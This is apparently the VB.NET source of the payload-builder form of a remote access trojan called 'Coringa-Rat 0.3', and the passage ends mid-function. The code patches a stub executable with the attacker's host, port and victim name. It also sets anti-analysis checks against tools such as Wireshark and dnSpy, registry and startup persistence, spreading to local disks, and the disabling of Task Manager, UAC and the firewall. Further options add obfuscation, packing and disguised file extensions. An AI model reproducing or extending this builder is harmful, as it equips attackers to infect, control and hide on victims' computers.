Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports Mono.Collections.Generic
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports System.IO
Imports System.Text
Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Net
Imports System.CodeDom.Compiler

'CODED BY HACKING SOOFT T
'CODED BY HACKING SOOFT T
'CODED BY HACKING SOOFT T

Public Class FrmServidor
    Dim ic As String

    Public Sub New()
        Me.ic = Nothing
        Me.InitializeComponent()
        Me.Text = "SERVIDOR : " & Environment.MachineName & "\" & Environment.UserName

        Try
            Dim U As String = String.Empty
            For N = 0 To My.Settings.MeusGupos.Count - 1
                U += My.Settings.MeusGupos.Item(N).ToString & vbNewLine
            Next

            Dim I As String() = Split(U, vbNewLine)
            For Each P In I
                Dim ua As String() = Split(P, "|")
                CBGrupos.Items.Add(ua(0) & "|" & ua(1))
            Next
        Catch ex As Exception

        End Try

        CBGrupos.SelectedIndex = 0
        CBIcones.SelectedIndex = 0
        CBTamanhoICO.SelectedIndex = 2
        CBUpx.SelectedIndex = 0
    End Sub

    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
        Application.DoEvents()

        If Not File.Exists(Application.StartupPath & "\Stub\Security.exe") Then
            MsgBox("STUB NÃO ENCONTRADA", MsgBoxStyle.Critical, "Informações")
            Exit Sub
        ElseIf txtHost.Text = Nothing Then
            MsgBox("Insira seu Host", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        ElseIf NDPorta.Value = Nothing Then
            MsgBox("Insira sua Porta", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        ElseIf txtNomeVitima.Text = Nothing Then
            MsgBox("Insira Nome da Vitima", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        ElseIf txtNomeProcesso.Text = Nothing Then
            MsgBox("Insira Nome do Servidor", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        End If

        Dim I As New SaveFileDialog
        I.Title = "SERVIDOR"
        I.Filter = Extension()
        I.FileName = TimeOfDay.ToString("ssmmhh MMddyyyy ss").Replace(" ", "")
        txtStatus.Clear()

        If I.ShowDialog = Windows.Forms.DialogResult.OK Then

            CriarStatus()
            ESPERA(10)

            Try
                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\Security.exe"))
                Dim definition2 As TypeDefinition
                For Each definition2 In definition.MainModule.GetTypes
                    Dim definition3 As MethodDefinition
                    For Each definition3 In definition2.Methods
                        If (definition3.Name = ".ctor") Then
                            Dim enumerator As IEnumerator(Of Instruction) = Nothing
                            Try
                                enumerator = definition3.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If (current.OpCode.Code = Code.Ldstr) Then

                                        Dim str As String = current.Operand.ToString


                                        If (str = "%NomeVitimas%") Then
                                            current.Operand = MdFN.ENB(txtNomeVitima.Text)
                                            Continue Do
                                        End If


                                        If (str = "%EncryptarrHost%") Then
                                            current.Operand = CKAtivarEncryptarHost.Checked.ToString
                                            Continue Do
                                        End If

                                        If CKAtivarEncryptarHost.Checked = True Then
                                            If (str = "%host%") Then
                                                current.Operand = txtEncryptHost.Text
                                                Continue Do
                                            End If
                                        Else
                                            If (str = "%host%") Then
                                                current.Operand = txtHost.Text
                                                Continue Do
                                            End If
                                        End If

                                        '===================================================================================================

                                        If (str = "%AntiSytemProcess%") Then
                                            current.Operand = CKAntiProcessExplorer.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiSbieCtrl%") Then
                                            current.Operand = CKAntiSbieCtrl.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiSpyTheSpy%") Then
                                            current.Operand = CKAntiSpyTheSpy.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiWireshark%") Then
                                            current.Operand = CKAntiWireshark.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiapateDNS%") Then
                                            current.Operand = CKAntiapateDNS.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiIPBlocker%") Then
                                            current.Operand = CKAntiIPBlocker.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiTiGeR_Firewall%") Then
                                            current.Operand = CKAntiTiGeR_Firewall.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%Antismsniff%") Then
                                            current.Operand = CKAntiSmsniff.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiexeinfoPE%") Then
                                            current.Operand = CKAntiexeinfoPE.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiNetSnifferCs%") Then
                                            current.Operand = CKAntiNetSnifferCs.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiSandboxie_Control%") Then
                                            current.Operand = CKAntiSandboxie_Control.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%Antiprocesshacker%") Then
                                            current.Operand = CKAntiProcesshacker.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiGerenciador%") Then
                                            current.Operand = CKAntiGerenciadorDeTarefas.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiMsconfig%") Then
                                            current.Operand = CKAntiMsconfig.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntidnSpy%") Then
                                            current.Operand = CKAntidnSpy.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiCodeReflect%") Then
                                            current.Operand = CKAntiCodeReflect.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiReflector%") Then
                                            current.Operand = CKAntiReflector.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AntiILSpy%") Then
                                            current.Operand = CKAntiILSpy.Checked.ToString
                                            Continue Do
                                        End If

                                        '============================================================================================================

                                        If (str = "%AdminPermisao%") Then
                                            current.Operand = CKPermisaoAdmin.Checked.ToString
                                            Continue Do
                                        End If

                                        '==========================================================================



                                        If (str = "%NomeDaPastaa%") Then
                                            current.Operand = txtNomePasta.Text
                                            Continue Do
                                        End If



                                        '===========================================================

                                        If (str = "%MinhaCorrText%") Then
                                            current.Operand = CBCores.Text
                                            Continue Do
                                        End If


                                        '===================================================================

                                        If (str = "%BBIDGrupoo%") Then
                                            Dim pasd As String() = Split(CBGrupos.Text, "|")
                                            current.Operand = pasd(0)
                                            Continue Do
                                        End If

                                        If (str = "%BBNomeGrupoo%") Then
                                            Dim pasda As String() = Split(CBGrupos.Text, "|")
                                            current.Operand = pasda(1)
                                            Continue Do
                                        End If

                                        '=================================================================================











                                        If (str = "%AtivarrMensagem%") Then
                                            current.Operand = CKAtivarMensagem.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%TitulooDaMensagem%") Then
                                            current.Operand = txtTitulo.Text
                                            Continue Do
                                        End If

                                        If (str = "%TextoDaMensagemm%") Then
                                            current.Operand = txtMensagem.Text
                                            Continue Do
                                        End If

                                        If (str = "%IconMensagemms%") Then
                                            current.Operand = MsgBoxIcones.ToString
                                            Continue Do
                                        End If

                                        If (str = "%ButaoMensagemms%") Then
                                            current.Operand = MsgBoxButao.ToString
                                            Continue Do
                                        End If

                                        If (str = "%OutroTipoDeMensagemsss%") Then
                                            current.Operand = RBbuttonOkCancelarAjuda.Checked.ToString
                                            Continue Do
                                        End If

                                        '==================================================================

                                        If (str = "%port%") Then
                                            current.Operand = NDPorta.Value.ToString
                                            Continue Do
                                        End If

                                        If (str = "%exe%") Then
                                            current.Operand = txtNomeProcesso.Text
                                            Continue Do
                                        End If

                                        If (str = "%ProtectProcessBSOD%") Then
                                            current.Operand = CKProtectProcess.Checked.ToString
                                            Continue Do
                                        End If

                                        '==========================================================

                                        If (str = "%AtivaaarStartUp%") Then
                                            current.Operand = CKCopiarStartUp.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%NomeDoArquivoStartUp%") Then
                                            current.Operand = txtNomeStartUp.Text
                                            Continue Do
                                        End If

                                        '==========================================================

                                        If (str = "%OcutarServidorr%") Then
                                            current.Operand = CKOcutarServidor.Checked.ToString
                                            Continue Do
                                        End If

                                        '=========================================================

                                        If (str = "%ChaveHKEY_CURRENT_USER%") Then
                                            current.Operand = CKHKEY_CURRENT_USER.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%NomeChaveHKEY_USER%") Then
                                            current.Operand = txtHKEY_CURRENT_USER.Text
                                            Continue Do
                                        End If

                                        If (str = "%ChaveHKEY_CURRENT_USER_RUN1%") Then
                                            current.Operand = CKPolicies.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%NomeChaveHKEY_USER_RUN1%") Then
                                            current.Operand = txtPolicies.Text
                                            Continue Do
                                        End If

                                        '==================================================================

                                        If (str = "%ChaveHKEY_LOCAL_MACHINE%") Then
                                            current.Operand = CKHKEY_LOCAL_MACHINE.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%NomeChaveHKEY_MACHINE%") Then
                                            current.Operand = txtHKEY_LOCAL_MACHINE.Text
                                            Continue Do
                                        End If

                                        If (str = "%ChaveHKEY_MACHINE_RUN2%") Then
                                            current.Operand = CKPolicies2.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%NomeChaveHKEY_MACHINE_RUN2%") Then
                                            current.Operand = txtPolicies2.Text
                                            Continue Do
                                        End If

                                        '==================================================================

                                        If (str = "%BypassFirewallWindows%") Then
                                            current.Operand = CKBypassFirewall.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%ListSites%") Then
                                            Dim Store As String = String.Empty
                                            For Each X As ListViewItem In LVListSites.Items
                                                Store &= "127.0.0.1 " & X.Text & ","
                                            Next
                                            current.Operand = Store
                                            Continue Do
                                        End If

                                        If (str = "%AtivarListSites%") Then
                                            current.Operand = CKBlockSites.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AtivarDelay%") Then
                                            current.Operand = CKAtivarDelay.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%TexxtoDelay%") Then
                                            current.Operand = NDDelaySegundos.Value.ToString
                                            Continue Do
                                        End If

                                        If (str = "%ExcluirArquivoMelt%") Then
                                            current.Operand = CKExcluirArquivo.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AgenndarServidor%") Then
                                            current.Operand = CKAgendarServidor.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%dir%") Then
                                            current.Operand = CBDiretorio.Text.Replace("%", "")
                                            Continue Do
                                        End If

                                        If (str = "%MinhaChaveMutex%") Then
                                            current.Operand = txtMutex.Text
                                            Continue Do
                                        End If
























                                        '=======================

                                        If (str = "%SpreadDiscoLocal%") Then
                                            current.Operand = CKSpreadDiscoLocal.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%TextoSpreadDiscoLocal%") Then
                                            current.Operand = txtNomeSpreadDiscoLocal.Text
                                            Continue Do
                                        End If

                                        '===========================================================================

                                        If (str = "%DesativarGerenciadorDeTarefass%") Then
                                            current.Operand = CKDesativarGerenciadorTarefas.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarCMDD%") Then
                                            current.Operand = CKDesativarCMD.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarRegeditT%") Then
                                            current.Operand = CKDesativarRegedit.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarExecutarR%") Then
                                            current.Operand = CKDesativarExecutar.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarUACC%") Then
                                            current.Operand = CKDesativarUAC.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarPainelDeControleE%") Then
                                            current.Operand = CKDesativarPainelControle.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarOpçõesDePastaA%") Then
                                            current.Operand = CKDesativarOpçõesdePasta.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarMenuContextoO%") Then
                                            current.Operand = CKDesativarMenuContexto.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarBarraDeTarefasS%") Then
                                            current.Operand = CKDesativarBarraDeTarefas.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%DesativarFirewallL%") Then
                                            current.Operand = CKDesativarFirewall.Checked.ToString
                                            Continue Do
                                        End If









                                    End If
                                Loop
                            Finally
                                enumerator.Dispose()
                            End Try
                        End If
                    Next
                Next

                definition.Write(I.FileName)

            Catch ex As Exception
                MsgBox("ERRO : OCORREU UM ERRO AO CRIAR O SERVIDOR TENTE NOVAMENTE", MsgBoxStyle.Critical, "Informações")
                Exit Sub
            End Try


            '====================================================================================================





            ' INJETAR ICONE
            If Not ic = Nothing Then
                Mdico.InjectIcon(I.FileName, ic)
            End If


            'INICIAR OFUSCAÇÃO
            If CKAtivarOfuscaçao.Checked Then
                txtStatus.Visible = True
                Dim mon As New MdOfuscação
                mon.T1 = txtStatus
                mon.randz(I.FileName)
            End If

            'DESCRIÇÃO
            If CKAtivardescricao.Checked Then
                MinhaDescricao(I.FileName)
            End If

            If CKUpx.Checked Then
                Application.DoEvents()
                If Not Directory.Exists(Application.StartupPath & "\UPX") Then
                    Directory.CreateDirectory(Application.StartupPath & "\UPX")
                End If
                Thread.Sleep(50)
                If Not File.Exists(Application.StartupPath & "\UPX\mpress.exe") Then
                    Dim N As Byte() = My.Resources.mpress
                    File.WriteAllBytes(Application.StartupPath & "\UPX\mpress.exe", N)
                End If
                Thread.Sleep(50)
                Shell("cmd.exe /C UPX\mpress.exe -s " & """" & I.FileName & """", AppWinStyle.NormalFocus, True, -1)
            End If


            'SALVAR CONFIGURAÇÕES
            SalvarConfig()


            Try 'PEGAR INFORMAÇÕES DO SERVIDOR
                '==============================================================================================================================
                Dim FiileInfo As New FileInfo(I.FileName)
                Dim nnnn As String = (FiileInfo.Length)
                Dim StrSize As String
                If nnnn >= 1073741824 Then
                    StrSize = Format(FiileInfo.Length / 1024 / 1024 / 1024, "#0.00") & " GB"
                ElseIf nnnn >= 1048576 Then
                    StrSize = Format(FiileInfo.Length / 1024 / 1024, "#0.00") & " MB"
                ElseIf nnnn >= 1024 Then
                    StrSize = Format(FiileInfo.Length / 1024, "#0.00") & " KB"
                End If

                ESPERA(10)
                txtStatus.AppendText(vbNewLine & "-- INFORMAÇÕES --" & vbNewLine)
                ESPERA(10)
                txtStatus.AppendText("-- ARQUIVO : " & Path.GetFileName(I.FileName) & vbNewLine)
                ESPERA(10)
                txtStatus.AppendText("-- TAMANHO : " & StrSize & vbNewLine)
                ESPERA(10)
                txtStatus.AppendText("-- HORA : " & TimeOfDay.ToLongTimeString & vbNewLine)
                ESPERA(10)
                txtStatus.AppendText("-- DIRETÓRIO : " & I.FileName & vbNewLine & vbNewLine)
                ESPERA(10)
                txtStatus.AppendText("-- SERVIDOR CRIADO COM SUCESSO --" & vbNewLine)
                ESPERA(10)
                txtStatus.AppendText("-- CONFIGURAÇÕES SALVA EM (HKEY_CURRENT_USER\Software\" & Path.GetFileName(Application.ExecutablePath) & ") --" & vbNewLine)
            Catch ex As Exception

            End Try
        End If

    End Sub

    Public Sub ESPERA(ByVal INTERVALO As Integer)
        Dim PARADA As New Stopwatch
        PARADA.Start()
        Do While PARADA.ElapsedMilliseconds < INTERVALO
            Application.DoEvents()
        Loop
        PARADA.Stop()
    End Sub

    Private Sub FrmServidor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Application.DoEvents()
        On Error Resume Next

        CBCores.DataSource = ListarTodasCores()

        CBCores.SelectedIndex = 0

        Dim YyY As RegistryKey : YyY = Registry.CurrentUser.OpenSubKey("Software\Coringa-Rat 0.3", True)
        If Not YyY Is Nothing Then 'EXISTE

            'PARTE-01===CONEXÃO============================================================================================================================================

            txtNomeVitima.Text = MdFN.GetValueReg("Nome (Conexão)")

            CKAtivarEncryptarHost.Checked = MdFN.GetValueReg("Encryptar (Host)")

            txtHost.Text = MdFN.GetValueReg("Host (Conexão)")

            txtEncryptHost.Text = MdFN.GetValueReg("Encryptação (Host)")

            NDPorta.Value = FrmMain.port

            CKAtivarDelay.Checked = MdFN.GetValueReg("Delay")

            NDDelaySegundos.Value = MdFN.GetValueReg("Segundos")

            '===============================================================================================================================================

            'PARTE-02===INSTALAÇÃO============================================================================================================================================

            txtNomeProcesso.Text = MdFN.GetValueReg("Nome (Processo)")

            CBDiretorio.SelectedIndex = CBDiretorio.FindString(MdFN.GetValueReg("Diretório"))

            CKCopiarStartUp.Checked = MdFN.GetValueReg("Copiar StartUp")

            txtNomeStartUp.Text = MdFN.GetValueReg("Nome StartUp")

            CKSpreadDiscoLocal.Checked = MdFN.GetValueReg("Spread Disco Local")

            txtNomeSpreadDiscoLocal.Text = MdFN.GetValueReg("Nome Spread Disco Local")

            CKHKEY_CURRENT_USER.Checked = MdFN.GetValueReg("HKEY_CURRENT_USER")

            txtHKEY_CURRENT_USER.Text = MdFN.GetValueReg("Nome HKEY_CURRENT_USER")

            CKHKEY_LOCAL_MACHINE.Checked = MdFN.GetValueReg("HKEY_LOCAL_MACHINE")

            txtHKEY_LOCAL_MACHINE.Text = MdFN.GetValueReg("Nome HKEY_LOCAL_MACHINE")

            CKPolicies.Checked = MdFN.GetValueReg("HKEY_CURRENT_USER, Policies")

            txtPolicies.Text = MdFN.GetValueReg("Nome HKEY_CURRENT_USER, Policies")

            CKPolicies2.Checked = MdFN.GetValueReg("HKEY_LOCAL_MACHINE, Policies")

            txtPolicies2.Text = MdFN.GetValueReg("Nome HKEY_LOCAL_MACHINE, Policies")

            '===============================================================================================================================================

            'PARTE-03====MENSAGEM===========================================================================================================================================

            CKAtivarMensagem.Checked = MdFN.GetValueReg("Mensagem")

            txtTitulo.Text = MdFN.GetValueReg("Titulo (Mensagem)")

            txtMensagem.Text = MdFN.GetValueReg("Texto (Mensagem)")

            '===============================================================================================================================================

            'PARTE-04====ICONES===========================================================================================================================================

            If File.Exists(MdFN.GetValueReg("Icones")) Then : ic = MdFN.GetValueReg("Icones") : PicIco.Image = Image.FromFile(ic) : End If

            '===============================================================================================================================================

            'PARTE-05====ANTI-PROCESS===========================================================================================================================================

            CKAntiProcessExplorer.Checked = MdFN.GetValueReg("Anti Process Explorer")

            CKAntiSbieCtrl.Checked = MdFN.GetValueReg("Anti SbieCtrl")

            CKAntiSpyTheSpy.Checked = MdFN.GetValueReg("Anti SpyTheSpy")

            CKAntiWireshark.Checked = MdFN.GetValueReg("Anti Wireshark")

            CKAntiapateDNS.Checked = MdFN.GetValueReg("Anti apateDNS")

            CKAntiIPBlocker.Checked = MdFN.GetValueReg("Anti IPBlocker")

            CKAntiTiGeR_Firewall.Checked = MdFN.GetValueReg("Anti TiGeR-Firewall")

            CKAntiSmsniff.Checked = MdFN.GetValueReg("Anti Smsniff")

            CKAntiexeinfoPE.Checked = MdFN.GetValueReg("Anti exeinfoPE")

            CKAntiNetSnifferCs.Checked = MdFN.GetValueReg("Anti NetSnifferCs")

            CKAntiSandboxie_Control.Checked = MdFN.GetValueReg("Anti Sandboxie Control")

            CKAntiProcesshacker.Checked = MdFN.GetValueReg("Anti Process Hacker")

            CKAntiGerenciadorDeTarefas.Checked = MdFN.GetValueReg("Anti Gerenciador de Tarefas")

            CKAntiMsconfig.Checked = MdFN.GetValueReg("Anti Msconfig")

            CKAntidnSpy.Checked = MdFN.GetValueReg("Anti dnSpy")

            CKAntiCodeReflect.Checked = MdFN.GetValueReg("Anti Code Reflect")

            CKAntiReflector.Checked = MdFN.GetValueReg("Anti Reflector")

            CKAntiILSpy.Checked = MdFN.GetValueReg("Anti ILSpy")

            '===============================================================================================================================================

            'PARTE-06=========BLOQUEAR=(SITES)======================================================================================================================================

            CKBlockSites.Checked = MdFN.GetValueReg("Bloquear (Sites)")

            If Not MdFN.GetValueReg("Lista de Sites (Bloquear Sites)") = Nothing Then
                Dim N As String() = Split(GetValueReg("Lista de Sites (Bloquear Sites)"), ",")
                For Each U In N
                    LVListSites.Items.Add(U).ImageIndex = 0
                Next
            End If

            '===============================================================================================================================================

            'PARTE-07====WINDOWS===========================================================================================================================================

            CKDesativarGerenciadorTarefas.Checked = MdFN.GetValueReg("Desativar Gerenciador de Tarefas")

            CKDesativarCMD.Checked = MdFN.GetValueReg("Desativar CMD")

            CKDesativarRegedit.Checked = MdFN.GetValueReg("Desativar Regedit")

            CKDesativarExecutar.Checked = MdFN.GetValueReg("Desativar Executar")

            CKDesativarUAC.Checked = MdFN.GetValueReg("Desativar UAC")

            CKDesativarPainelControle.Checked = MdFN.GetValueReg("Desativar Painel de Controle")

            CKDesativarOpçõesdePasta.Checked = MdFN.GetValueReg("Desativar Opções de Pasta")

            CKDesativarMenuContexto.Checked = MdFN.GetValueReg("Desativar Menu Contexto")

            CKDesativarBarraDeTarefas.Checked = MdFN.GetValueReg("Desativar Barra de Tarefas")

            CKDesativarFirewall.Checked = MdFN.GetValueReg("Desativar Firewall")

            CKPermisaoAdmin.Checked = MdFN.GetValueReg("For. Permissão de Administrador")

            '===============================================================================================================================================

            'PARTE-08====SHIELD===========================================================================================================================================

            CKProtectProcess.Checked = MdFN.GetValueReg("Protect Process [BSOD]")

            CKExcluirArquivo.Checked = MdFN.GetValueReg("Excluir Arquivo (Melt)")

            CKAgendarServidor.Checked = MdFN.GetValueReg("Agendar Servidor 1 Min.")

            CKUpx.Checked = MdFN.GetValueReg("UPX")

            CKOcutarServidor.Checked = MdFN.GetValueReg("Ocutar Servidor")

            CKBypassFirewall.Checked = MdFN.GetValueReg("Bypass Firewall Windows")

            CKAntiKillProcess.Checked = MdFN.GetValueReg("Anti Kill Process /OFF")

            '===============================================================================================================================================

            'PARTE-10====OFUSCAÇÃO===========================================================================================================================================

            CKAtivarOfuscaçao.Checked = MdFN.GetValueReg("Ativar (Ofuscaçao)")

            txtStringOfuscador.Text = MdFN.GetValueReg("Strings (Ofuscaçao)")

            NDQuantidadeStrings.Value = MdFN.GetValueReg("Quantidade (Ofuscaçao)")

            txtMutex.Text = MdFN.GetValueReg("Mutex (Ofuscaçao)")

            CBStorageMethod.SelectedIndex = CBStorageMethod.FindString(MdFN.GetValueReg("Storage Method (Ofuscaçao)"))

            '===============================================================================================================================================

            'PARTE-12====FINALIZAÇÃO===========================================================================================================================================

            CBextensão.SelectedIndex = CBextensão.FindString(MdFN.GetValueReg("Extensão (Binder)"))

        Else

            CBDiretorio.SelectedIndex = 0
            CBStorageMethod.SelectedIndex = 0
            CBextensão.SelectedIndex = 0

        End If
    End Sub

    Private Sub CKMensagem_CheckedChanged(sender As Object, e As EventArgs) Handles CKAtivarMensagem.CheckedChanged
        If CKAtivarMensagem.Checked = True Then
            GroupBox13.Enabled = True
            GroupBox14.Enabled = True
            lbMSG.Enabled = True
            txtTitulo.Enabled = True
            txtMensagem.Enabled = True
            btnTestMensagem.Enabled = True
        Else
            GroupBox13.Enabled = False
            GroupBox14.Enabled = False
            lbMSG.Enabled = False
            txtTitulo.Enabled = False
            txtMensagem.Enabled = False
            btnTestMensagem.Enabled = False
        End If
    End Sub

    Private Sub btnIco_Click(sender As Object, e As EventArgs) Handles btnIco.Click
        Dim I As New OpenFileDialog
        I.Title = "ARQUIVOS"
        I.Filter = "ARQUIVOS (*.ico)|*.ico"
        If I.ShowDialog = Windows.Forms.DialogResult.OK Then
            ic = I.FileName
            PicIco.Image = Image.FromFile(ic)
        End If
    End Sub

    Private Sub btnTirarIco_Click(sender As Object, e As EventArgs) Handles btnTirarIco.Click
        ic = Nothing
        PicIco.Image = Nothing
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click, PictureBox7.Click, PictureBox21.Click, PictureBox22.Click
        MsgBox("ESTA OPÇÃO SO FUNCIONARA SO COM PERMISSÃO DO ADMINISTRADOR DO COMPUTADOR DO USUÁRIO", MsgBoxStyle.Information, "Informações")
    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        RDPergunta.Checked = True
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        RDErro.Checked = True
    End Sub

    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        RDAtencao.Checked = True
    End Sub

    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        RDInformacao.Checked = True
    End Sub

    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click
        RDNenhum.Checked = True
    End Sub

    Private Sub btnAdiconarSites_Click(sender As Object, e As EventArgs) Handles btnAdiconarSites.Click
        If CBListaSites.Text = Nothing Then
            MsgBox("INSIRA A URL DO SITE", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        End If

        LVListSites.Items.Add(CBListaSites.Text).ImageIndex = 0

    End Sub

    Private Sub ExcluirTodosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExcluirTodosToolStripMenuItem.Click
        LVListSites.Items.Clear()
    End Sub

    Private Sub ExcluirToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExcluirToolStripMenuItem.Click
        For Each N As ListViewItem In LVListSites.SelectedItems
            N.Remove()
        Next
    End Sub

    Private Sub CBBlockSites_CheckedChanged(sender As Object, e As EventArgs) Handles CKBlockSites.CheckedChanged
        If CKBlockSites.Checked Then
            LVListSites.Enabled = True
            CBListaSites.Enabled = True
            btnAdiconarSites.Enabled = True
        Else
            LVListSites.Enabled = False
            CBListaSites.Enabled = False
            btnAdiconarSites.Enabled = False
        End If
    End Sub

    Function Extension() As String
        On Error Resume Next
        Select Case CBextensão.SelectedIndex
            Case 0
                Return "Executable Files (.exe)|*.exe"
            Case 1
                Return "SCR Files (.scr)|*.scr"
            Case 2
                Return "COM Files (.com)|*.com"
            Case 3
                Return "Batch Files (.bat)|*.bat"
            Case 4
                Return "PIF Files (.pif)|*.pif"
        End Select
    End Function


    Private Sub CKAtivarDelay_CheckedChanged(sender As Object, e As EventArgs) Handles CKAtivarDelay.CheckedChanged
        If CKAtivarDelay.Checked Then
            NDDelaySegundos.Enabled = True
        Else
            NDDelaySegundos.Enabled = False
        End If
    End Sub

    Private Sub txtHost_TextChanged(sender As Object, e As EventArgs) Handles txtHost.TextChanged
        If CKAtivarEncryptarHost.Checked Then
            txtEncryptHost.Text = MdFN.ENB(txtHost.Text)
        End If
    End Sub

    Dim MsgBoxIcones As MessageBoxIcon
    Dim MsgBoxButao As MessageBoxButtons
    Private Sub btnTestMensagem_Click(sender As Object, e As EventArgs) Handles btnTestMensagem.Click

        'ICONES
        If RDPergunta.Checked Then
            MsgBoxIcones = MessageBoxIcon.Question
        ElseIf RDErro.Checked Then
            MsgBoxIcones = MessageBoxIcon.Error
        ElseIf RDAtencao.Checked Then
            MsgBoxIcones = MessageBoxIcon.Exclamation
        ElseIf RDInformacao.Checked Then
            MsgBoxIcones = MessageBoxIcon.Information
        ElseIf RDNenhum.Checked Then
            MsgBoxIcones = MessageBoxIcon.None
        End If
        'BUTÕES
        If RBButtonOk.Checked Then
            MsgBoxButao = MessageBoxButtons.OK
        ElseIf TBButtonOkCencelar.Checked Then
            MsgBoxButao = MessageBoxButtons.OKCancel
        ElseIf RBButtonRepetirCancelar.Checked Then
            MsgBoxButao = MessageBoxButtons.RetryCancel
        ElseIf RBButtonSimNao.Checked Then
            MsgBoxButao = MessageBoxButtons.YesNo
        ElseIf RBButtonSimNaoCancelar.Checked Then
            MsgBoxButao = MessageBoxButtons.YesNoCancel
        ElseIf RBButtonAnularRepetirIgnorar.Checked Then
            MsgBoxButao = MessageBoxButtons.AbortRetryIgnore
        End If

        If RBbuttonOkCancelarAjuda.Checked Then
            MessageBox.Show(txtMensagem.Text, txtTitulo.Text, MessageBoxButtons.OKCancel, MsgBoxIcones, MessageBoxDefaultButton.Button1, Nothing, True)
        Else
            MessageBox.Show(txtMensagem.Text, txtTitulo.Text, MsgBoxButao, MsgBoxIcones)
        End If

    End Sub

    Private Sub CKHKEY_CURRENT_USER_CheckedChanged(sender As Object, e As EventArgs) Handles CKHKEY_CURRENT_USER.CheckedChanged
        If CKHKEY_CURRENT_USER.Checked Then
            txtHKEY_CURRENT_USER.Enabled = True
        Else
            txtHKEY_CURRENT_USER.Enabled = False
        End If
    End Sub

    Private Sub CKHKEY_LOCAL_MACHINE_CheckedChanged(sender As Object, e As EventArgs) Handles CKHKEY_LOCAL_MACHINE.CheckedChanged
        If CKHKEY_LOCAL_MACHINE.Checked Then
            txtHKEY_LOCAL_MACHINE.Enabled = True
        Else
            txtHKEY_LOCAL_MACHINE.Enabled = False
        End If
    End Sub

    Private Sub CKPolicies_CheckedChanged(sender As Object, e As EventArgs) Handles CKPolicies.CheckedChanged
        If CKPolicies.Checked Then
            txtPolicies.Enabled = True
        Else
            txtPolicies.Enabled = False
        End If
    End Sub

    Private Sub TreeView1_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles TreeView1.AfterSelect
        If TreeView1.SelectedNode.Text = "Conexão" Then
            TabControl1.SelectedTab = TBConexão
        ElseIf TreeView1.SelectedNode.Text = "Instalação" Then
            TabControl1.SelectedTab = TBInstalação
        ElseIf TreeView1.SelectedNode.Text = "Mensagem" Then
            TabControl1.SelectedTab = TBMensagem
        ElseIf TreeView1.SelectedNode.Text = "Icones" Then
            TabControl1.SelectedTab = TBIcones
        ElseIf TreeView1.SelectedNode.Text = "Anti Process" Then
            TabControl1.SelectedTab = TBAntiProcess
        ElseIf TreeView1.SelectedNode.Text = "Bloquear Sites" Then
